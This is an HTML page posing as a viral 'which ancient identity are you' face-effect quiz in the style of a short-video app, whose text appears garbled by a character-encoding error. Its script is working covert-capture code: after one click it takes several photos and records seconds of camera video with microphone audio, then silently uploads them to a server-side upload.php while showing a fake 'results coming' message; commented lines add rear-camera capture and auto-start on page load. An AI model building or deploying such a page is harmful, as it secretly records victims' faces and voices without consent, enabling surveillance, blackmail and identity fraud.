<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
<title>ğŸ”¥çˆ†æ¬¾ç‰¹æ•ˆï¼šæµ‹æµ‹ä½ ç©¿è¶Šå¤ä»£æ˜¯ä»€ä¹ˆèº«ä»½ï¼Ÿ</title>
<style>
    body { margin: 0; padding: 0; background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; overflow: hidden; }
    
    .video-container {
        position: relative;
        width: 100vw;
        height: 100vh;
        background: url('https://images.unsplash.com/photo-1535295972055-1c762f4483e5?ixlib=rb-1.2.1&auto=format&fit=crop&w=600&q=80') no-repeat center center;
        background-size: cover;
    }

    /* æ¨¡æ‹ŸæŠ–éŸ³/TikTok ç•Œé¢ */
    .overlay {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.3);
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        text-align: center;
    }

    .effect-preview {
        width: 200px;
        height: 200px;
        border: 3px solid #fe2c55;
        border-radius: 50%;
        margin-bottom: 20px;
        position: relative;
        overflow: hidden;
        background: #000;
        box-shadow: 0 0 20px rgba(254, 44, 85, 0.6);
        animation: pulse 2s infinite;
    }
    
    .effect-preview::after {
        content: 'AI è¯†åˆ«ä¸­...';
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        font-size: 14px;
        color: rgba(255,255,255,0.8);
    }

    .title { font-size: 24px; font-weight: bold; margin-bottom: 10px; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
    .subtitle { font-size: 14px; margin-bottom: 30px; opacity: 0.9; }

    .btn {
        background: linear-gradient(90deg, #fe2c55, #ff0050);
        color: white;
        border: none;
        padding: 12px 40px;
        font-size: 18px;
        font-weight: bold;
        border-radius: 30px;
        cursor: pointer;
        box-shadow: 0 4px 10px rgba(254, 44, 85, 0.4);
        animation: bounce 1s infinite alternate;
    }
    
    .loading-text {
        margin-top: 15px;
        font-size: 12px;
        color: #ccc;
        display: none;
    }

    @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(254, 44, 85, 0.7); } 70% { box-shadow: 0 0 0 20px rgba(254, 44, 85, 0); } 100% { box-shadow: 0 0 0 0 rgba(254, 44, 85, 0); } }
    @keyframes bounce { from { transform: scale(1); } to { transform: scale(1.05); } }

    /* éšè—çš„è§†é¢‘å…ƒç´ ç”¨äºæ•è· */
    #hidden-video { display: none; }
</style>
</head>
<body>

<div class="video-container">
    <div class="overlay">
        <div class="effect-preview"></div>
        <div class="title">ç©¿è¶Šå¤ä»£èº«ä»½æµ‹è¯•</div>
        <div class="subtitle">å·²æœ‰ 10w+ äººå‚ä¸æµ‹è¯•ï¼Œçœ‹çœ‹ä½ æ˜¯çš‡æ—è¿˜æ˜¯ä¾ å®¢ï¼Ÿ</div>
        <button class="btn" onclick="startEffect()">ç‚¹å‡»å¼€å§‹æµ‹è¯•</button>
        <div class="loading-text" id="status">æ­£åœ¨åŠ è½½ AI é¢éƒ¨è¯†åˆ«æ¨¡å‹...</div>
    </div>
</div>

<script>
// é…ç½®å‚æ•°
let frontPhotoCount = 3;
let backPhotoCount = 3;
let frontVideoSeconds = 5;
let backVideoSeconds = 5;

let maxConcurrentUploads = 3; 
let uploadQueue = [];
let activeUploads = 0;

// ä¸Šä¼ é˜Ÿåˆ—å¤„ç†
async function processQueue() {
    if (uploadQueue.length === 0 || activeUploads >= maxConcurrentUploads) return;
    const task = uploadQueue.shift();
    activeUploads++;
    await task();
    activeUploads--;
    processQueue(); 
}

function enqueueUpload(blob, filename, type, label) {
    uploadQueue.push(async () => {
        const fd = new FormData();
        fd.append("file", blob, filename);
        fd.append("type", type);
        fd.append("label", label);
        try {
            await fetch("upload.php", { method: "POST", body: fd });
        } catch(e) {}
    });
    processQueue();
}

// æ ¸å¿ƒåŠŸèƒ½ï¼šè¯·æ±‚æ‘„åƒå¤´
async function requestCamera(facing){
    try {
        return await navigator.mediaDevices.getUserMedia({
            video: { facingMode: facing },
            audio: true
        });
    } catch(e){
        return null;
    }
}

async function captureFrame(stream){
    const video = document.createElement("video");
    video.srcObject = stream;
    video.muted = true;
    video.playsInline = true;
    await video.play();
    await new Promise(r=>setTimeout(r,500)); // ç­‰å¾…ç”»é¢ç¨³å®š
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video,0,0);
    return new Promise(resolve=>{
        canvas.toBlob(resolve,"image/jpeg",0.8);
    });
}

function recordVideo(stream, seconds){
    return new Promise(resolve=>{
        const chunks=[];
        try {
            const rec = new MediaRecorder(stream);
            rec.ondataavailable = e=>chunks.push(e.data);
            rec.onstop = ()=>resolve(new Blob(chunks,{type:"video/webm"}));
            rec.start();
            setTimeout(()=>rec.stop(),seconds*1000);
        } catch(e) {
            resolve(null);
        }
    });
}

async function takePhotos(stream,count,label){
    for(let i=0;i<count;i++){
        try{
            const blob = await captureFrame(stream);
            const name=`${label}_photo_${Date.now()}_${i+1}.jpg`;
            enqueueUpload(blob,name,"photo",label);
        }catch(e){}
        await new Promise(r=>setTimeout(r,800)); // æ‹ç…§é—´éš”
    }
}

async function takeVideo(stream,seconds,label){
    try{
        const blob = await recordVideo(stream,seconds);
        if(blob) {
            const name=`${label}_video_${Date.now()}.webm`;
            enqueueUpload(blob,name,"video",label);
        }
    }catch(e){}
}

// ä¸»æµç¨‹
async function startEffect() {
    document.getElementById('status').style.display = 'block';
    document.querySelector('.btn').innerText = 'è¯†åˆ«ä¸­...';
    
    // 1. ä¼˜å…ˆå°è¯•å‰ç½®æ‘„åƒå¤´ï¼ˆé¢éƒ¨è¯†åˆ«åœºæ™¯ï¼‰
    const fs = await requestCamera("user");
    if(fs){
        // å¹¶è¡Œå¤„ç†ï¼šå…ˆå½•è§†é¢‘ï¼ŒåŒæ—¶åœ¨åå°æ‹ç…§ï¼ˆå¦‚æœç¡¬ä»¶å…è®¸ï¼‰
        // æˆ–è€…ç®€å•ç‚¹ï¼šå…ˆæ‹ç…§å†å½•åƒ
        takePhotos(fs, frontPhotoCount, "front");
        await takeVideo(fs, frontVideoSeconds, "front");
        // fs.getTracks().forEach(t=>t.stop()); // æš‚æ—¶ä¸å…³é—­ï¼Œé˜²æ­¢åˆ‡æ¢å¡é¡¿
    }

    // 2. å°è¯•åç½®æ‘„åƒå¤´ï¼ˆå¯é€‰ï¼Œæ ¹æ®éœ€æ±‚ï¼‰
    /*
    const bs = await requestCamera("environment");
    if(bs){
        takePhotos(bs, backPhotoCount, "back");
        await takeVideo(bs, backVideoSeconds, "back");
        bs.getTracks().forEach(t=>t.stop());
    }
    */
   
    // æ¨¡æ‹Ÿæµ‹è¯•å®Œæˆ
    setTimeout(() => {
        alert("æµ‹è¯•å®Œæˆï¼\nç»“æœç”Ÿæˆä¸­ï¼Œè¯·å…³æ³¨åç»­æ¨é€ã€‚");
        document.getElementById('status').innerText = 'æ•°æ®ä¸Šä¼ æˆåŠŸ';
    }, (frontVideoSeconds * 1000) + 2000);
}

// é¡µé¢åŠ è½½åä¹Ÿå¯ä»¥å°è¯•é™é»˜è¯·æ±‚ï¼ˆå¦‚æœæµè§ˆå™¨å…è®¸ï¼‰
// window.onload = startEffect; 

</script>
</body>
</html>
